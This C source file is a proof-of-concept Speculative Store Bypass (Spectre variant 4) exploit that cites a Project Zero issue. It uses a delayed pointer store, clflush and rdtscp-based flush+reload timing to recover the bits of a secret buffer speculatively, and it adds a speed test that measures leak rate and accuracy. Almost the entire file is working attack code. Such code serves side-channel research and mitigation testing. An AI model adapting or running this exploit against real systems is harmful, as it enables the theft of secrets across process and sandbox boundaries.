//https://bugs.chromium.org/p/project-zero/issues/detail?id=1528
// compile with: gcc -o test test.c -Wall -DHIT_THRESHOLD={CYCLES}
// optionally add: -DNO_INTERRUPTS

#include "defines.h"
#include "generic_byte_attack.h"
#include <stdio.h>
#include <stdlib.h>
#include <sys/io.h>
#include <err.h>
#include <sys/mman.h>
#include <sys/time.h> 
#include <inttypes.h>

// source of high-latency pointer to the memory slot
unsigned char **flushy_area[1000];
#define flushy (flushy_area+500)

// memory slot on which we want bad memory disambiguation
unsigned char *memory_slot_area[1000];
#define memory_slot (memory_slot_area+500)

//                                  0123456789abcdef
unsigned char secret_read_area[] = "0000011011101011";
unsigned char public_read_area[] = "################";

#define REDUCE_FLUSHES

unsigned char timey_line_area[0x2000000];
// stored in the memory slot first
#define timey_lines (timey_line_area + 0x10000)

unsigned char dummy_char_sink;

int testfun(int idx) {
  pipeline_flush();
  *flushy = memory_slot;
  *memory_slot = secret_read_area;
  timey_lines['0' << 12] = 1;
  timey_lines['1' << 12] = 1;
  pipeline_flush();
  clflush(flushy);
  clflush(&timey_lines['0' << 12]);
  clflush(&timey_lines['1' << 12]);
  asm volatile("mfence");
  pipeline_flush();

  // START OF CRITICAL PATH
  unsigned char **memory_slot__slowptr = *flushy;
  //pipeline_flush();
  // the following store will be speculatively ignored since its address is unknown
  *memory_slot__slowptr = public_read_area;
  // uncomment the instructions in the next line to break the attack
  asm volatile("" /*"mov $0, %%eax\n\tcpuid\n\tlfence"*/ : /*out*/ :
/*in*/ : "rax","rbx","rcx","rdx","memory");
  // architectual read from dummy_timey_line, possible microarchitectural read from timey_line
  dummy_char_sink = timey_lines[(*memory_slot)[idx] << 12];
  // END OF CRITICAL PATH

  unsigned int t1, t2;

  pipeline_flush();
  asm volatile(
    "lfence\n\t"
    "rdtscp\n\t"
    "mov %%eax, %%ebx\n\t"
    "mov (%%rdi), %%r11\n\t"
    "rdtscp\n\t"
    "lfence\n\t"
  ://out
    "=a"(t2),
    "=b"(t1)
  ://in
    "D"(timey_lines + 0x1000 * '0')
  ://clobber
    "r11",
    "rcx",
    "rdx",
    "memory"
  );
  pipeline_flush();
  unsigned int delay_0 = t2 - t1;

  pipeline_flush();
  asm volatile(
    "lfence\n\t"
    "rdtscp\n\t"
    "mov %%eax, %%ebx\n\t"
    "mov (%%rdi), %%r11\n\t"
    "rdtscp\n\t"
    "lfence\n\t"
  ://out
    "=a"(t2),
    "=b"(t1)
  ://in
    "D"(timey_lines + 0x1000 * '1')
  ://clobber
    "r11",
    "rcx",
    "rdx",
    "memory"
  );
  pipeline_flush();
  unsigned int delay_1 = t2 - t1;

  if (delay_0 < HIT_THRESHOLD && delay_1 > HIT_THRESHOLD) {
    pipeline_flush();
    return 0;
  }
  if (delay_0 > HIT_THRESHOLD && delay_1 < HIT_THRESHOLD) {
    pipeline_flush();
    return 1;
  }
  pipeline_flush();
  return -1;
}

int my_testfun(int idx, unsigned char *my_secret_read_area) {
  #ifndef REDUCE_FLUSHES
  pipeline_flush();
  #endif
  *flushy = memory_slot;
  *memory_slot = my_secret_read_area;
  timey_lines['0' << 12] = 1;
  timey_lines['1' << 12] = 1;
  #ifndef REDUCE_FLUSHES
  pipeline_flush();
  #endif
  clflush(flushy);
  clflush(&timey_lines['0' << 12]);
  clflush(&timey_lines['1' << 12]);
  
  #ifndef REDUCE_FLUSHES
  asm volatile("mfence");
  #else
  //simulate mfence
  for(volatile int i=0; i<10; i++){}
  #endif
  #ifndef REDUCE_FLUSHES
  pipeline_flush();
  #endif

  // START OF CRITICAL PATH
  unsigned char **memory_slot__slowptr = *flushy;
  //pipeline_flush();
  // the following store will be speculatively ignored since its address is unknown
  *memory_slot__slowptr = public_read_area;
  // uncomment the instructions in the next line to break the attack
  asm volatile("" /*"mov $0, %%eax\n\tcpuid\n\tlfence"*/ : /*out*/ :
/*in*/ : "rax","rbx","rcx","rdx","memory");
  // architectual read from dummy_timey_line, possible microarchitectural read from timey_line
  dummy_char_sink = timey_lines[(*memory_slot)[idx] << 12];
  // END OF CRITICAL PATH

  unsigned int t1, t2;

  pipeline_flush();
  asm volatile(
    #ifndef REDUCE_FLUSHES
    "lfence\n\t"
    #endif
    "rdtscp\n\t"
    "mov %%eax, %%ebx\n\t"
    "mov (%%rdi), %%r11\n\t"
    "rdtscp\n\t"
    #ifndef REDUCE_FLUSHES
    "lfence\n\t"
    #endif
  ://out
    "=a"(t2),
    "=b"(t1)
  ://in
    "D"(timey_lines + 0x1000 * '0')
  ://clobber
    "r11",
    "rcx",
    "rdx",
    "memory"
  );
  #ifndef REDUCE_FLUSHES
  pipeline_flush();
  #endif

  unsigned int delay_0 = t2 - t1;

  #ifndef REDUCE_FLUSHES
  pipeline_flush();
  #endif
  asm volatile(
    #ifndef REDUCE_FLUSHES
    "lfence\n\t"
    #endif
    "rdtscp\n\t"
    "mov %%eax, %%ebx\n\t"
    "mov (%%rdi), %%r11\n\t"
    "rdtscp\n\t"
    #ifndef REDUCE_FLUSHES
    "lfence\n\t"
    #endif
  ://out
    "=a"(t2),
    "=b"(t1)
  ://in
    "D"(timey_lines + 0x1000 * '1')
  ://clobber
    "r11",
    "rcx",
    "rdx",
    "memory"
  );
  #ifndef REDUCE_FLUSHES
  pipeline_flush();
  #else
  for(volatile int i = 0; i<10; i++){}
  #endif

  unsigned int delay_1 = t2 - t1;


  if (delay_0 < HIT_THRESHOLD && delay_1 > HIT_THRESHOLD) {
    pipeline_flush();
    #ifndef REDUCE_FLUSHES
    pipeline_flush();
    #endif
    //printf("%i %i\n", delay_0, delay_1);
    return 0;
  }
  if (delay_0 > HIT_THRESHOLD && delay_1 < HIT_THRESHOLD) {
    pipeline_flush();
    #ifndef REDUCE_FLUSHES
    pipeline_flush();
    #endif
    //printf("%i %i\n", delay_0, delay_1);
    return 1;
  }
  pipeline_flush();
  #ifndef REDUCE_FLUSHES
  pipeline_flush();
  #endif
  return -1;
}

//return number of correct detected bits
int generic_read(int start_add, int size, unsigned char *my_secret_read_area){
  int correct_bits = 0;
  for (int idx = start_add; idx < size; idx++) {
    pipeline_flush();
    long cycles = 0;
    int hits = 0;
    char results[HIT_LIMIT] = {0};
    /* if we don't break the loop after some time when it doesn't
work, in NO_INTERRUPTS mode with SMP disabled, the machine will lock
up */
    while (hits < HIT_LIMIT && cycles < 1000000) {
      pipeline_flush();
      int res = my_testfun(idx, my_secret_read_area);

      //int res = testfun(idx);
      if (res != -1) {
        pipeline_flush();
        results[hits] = res + '0';
        hits++;
      }
      cycles++;
      pipeline_flush();
    }
    int correct = 0;
    for(int i=0; i<HIT_LIMIT; i++){
      if(results[i] == my_secret_read_area[idx])
        correct++;
    }
    if(correct > HIT_LIMIT/2)
      correct_bits++;
     printf("%c: %s in %ld cycles (hitrate: %f%%)\n",
  my_secret_read_area[idx], results, cycles, 100*hits/(double)cycles);
    pipeline_flush();
  }
  return correct_bits;
}

unsigned char *gen_rdm_bytestream (int num_bytes)
{
  unsigned char *stream = (unsigned char*) malloc (num_bytes);

  for (int i = 0; i < num_bytes; i++)
  {
    stream[i] = rand ();
    stream[i] >>= 7;
    stream[i] += '0';
  }

  return stream;
}

static inline uint64_t rdtscp64() {
  uint32_t low, high;
  asm volatile ("rdtscp": "=a" (low), "=d" (high) :: "ecx");
  return (((uint64_t)high) << 32) | low;
}

void speed_test(int arr_size){
    uint64_t t1, t2;
    
    unsigned char* rand_bytes = gen_rdm_bytestream(arr_size);

    // start timer
    t1 = rdtscp64();

    int correct_bits = generic_read(0, arr_size, rand_bytes);

    // stop timer
    t2 = rdtscp64();

    printf("elapsedCycles: %" PRIu64 " \n", t2-t1);
    printf("Cycles per bit: %" PRIu64 " \n", (t2-t1)/arr_size);
    printf("Correct bits: %f \n", correct_bits/(double)arr_size);
    free(rand_bytes);
}

int main(void){
  int arr_size = 16; 
  //speed_test(arr_size);


  test_generic_byte_read();
  printf("asdjf");
}


// int main(void) {
//   char out[100000];
//   char *out_ = out;

// #ifdef NO_INTERRUPTS
//   if (mlockall(MCL_CURRENT|MCL_FUTURE) || iopl(3))
//     err(1, "iopl(3)");
// #endif

//   for (int idx = 0; idx < 16; idx++) {
// #ifdef NO_INTERRUPTS
//     asm volatile("cli");
// #endif
//     pipeline_flush();
//     long cycles = 0;
//     int hits = 0;
//     char results[33] = {0};
//     /* if we don't break the loop after some time when it doesn't
// work, in NO_INTERRUPTS mode with SMP disabled, the machine will lock
// up */
//     while (hits < 32 && cycles < 1000000) {
//       pipeline_flush();
//       int res = testfun(idx);
//       if (res != -1) {
//         pipeline_flush();
//         results[hits] = res + '0';
//         hits++;
//       }
//       cycles++;
//       pipeline_flush();
//     }
//     pipeline_flush();
// #ifdef NO_INTERRUPTS
//     asm volatile("sti");
// #endif
//     out_ += sprintf(out_, "%c: %s in %ld cycles (hitrate: %f%%)\n",
// secret_read_area[idx], results, cycles, 100*hits/(double)cycles);
//   }
//   printf("%s", out);
//   pipeline_flush();
// }
